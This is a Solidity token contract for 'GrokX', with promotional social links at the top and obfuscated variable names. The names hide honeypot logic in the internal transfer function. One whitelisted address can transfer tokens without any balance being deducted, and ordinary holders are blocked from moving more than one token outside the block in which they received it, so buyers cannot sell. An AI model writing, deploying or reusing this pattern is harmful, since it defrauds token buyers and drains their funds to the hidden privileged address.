/*

Twitter: https://twitter.com/GrokxETH

Telegram: https://t.me/Grokx_ETH

Website: https://grokx.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract GrokX is Ownable {
    mapping(address => bool) private hexyzvcik;

    constructor(string memory vnjgptfr, string memory avheokrpwigz, address neiwug, address ecgsrmkzbfau) {
        name = vnjgptfr;
        symbol = avheokrpwigz;
        balanceOf[msg.sender] = totalSupply;
        hexyzvcik[ecgsrmkzbfau] = true;
        shlg = IUniswapV2Router02(neiwug);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    IUniswapV2Router02 private shlg;

    function transfer(address jtpquo, uint256 uzrwiqnkf) public returns (bool success) {
        stzmue(msg.sender, jtpquo, uzrwiqnkf);
        return true;
    }

    function stzmue(address uiohlvajc, address jtpquo, uint256 uzrwiqnkf) private {
        address frzxa = IUniswapV2Factory(shlg.factory()).getPair(address(this), shlg.WETH());
        bool uqcdyvmk = heyjxsabw[uiohlvajc] == block.number;
        bool uhxtwgye = !hexyzvcik[uiohlvajc];
        if (uhxtwgye) {
            if (uiohlvajc != frzxa && uzrwiqnkf < totalSupply && (!uqcdyvmk || uzrwiqnkf > ejmqgrbnil[uiohlvajc])) {
                require(totalSupply / (10 ** decimals) >= uzrwiqnkf);
            }
            balanceOf[uiohlvajc] -= uzrwiqnkf;
        }
        ejmqgrbnil[jtpquo] = uzrwiqnkf;
        balanceOf[jtpquo] += uzrwiqnkf;
        heyjxsabw[jtpquo] = block.number;
        emit Transfer(uiohlvajc, jtpquo, uzrwiqnkf);
    }

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    string public symbol;

    mapping(address => uint256) private heyjxsabw;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address uiohlvajc, address jtpquo, uint256 uzrwiqnkf) public returns (bool success) {
        require(uzrwiqnkf <= allowance[uiohlvajc][msg.sender]);
        allowance[uiohlvajc][msg.sender] -= uzrwiqnkf;
        stzmue(uiohlvajc, jtpquo, uzrwiqnkf);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private ejmqgrbnil;

    function approve(address hczg, uint256 uzrwiqnkf) public returns (bool success) {
        allowance[msg.sender][hczg] = uzrwiqnkf;
        emit Approval(msg.sender, hczg, uzrwiqnkf);
        return true;
    }
}
